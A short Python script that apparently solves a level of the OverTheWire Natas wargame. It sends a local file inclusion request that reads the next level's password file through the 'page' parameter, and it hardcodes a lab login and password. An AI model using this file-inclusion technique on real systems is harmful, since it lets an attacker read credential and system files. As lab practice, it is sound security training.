import requests
#http://docs.python-requests.org/en/master/
#payload={'page':'home'}
url="http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8"
r=requests.get(url, auth=('natas7','7z3hEENjQtflzgnT29q7wAvMNfZdh0i9'))

print r.text
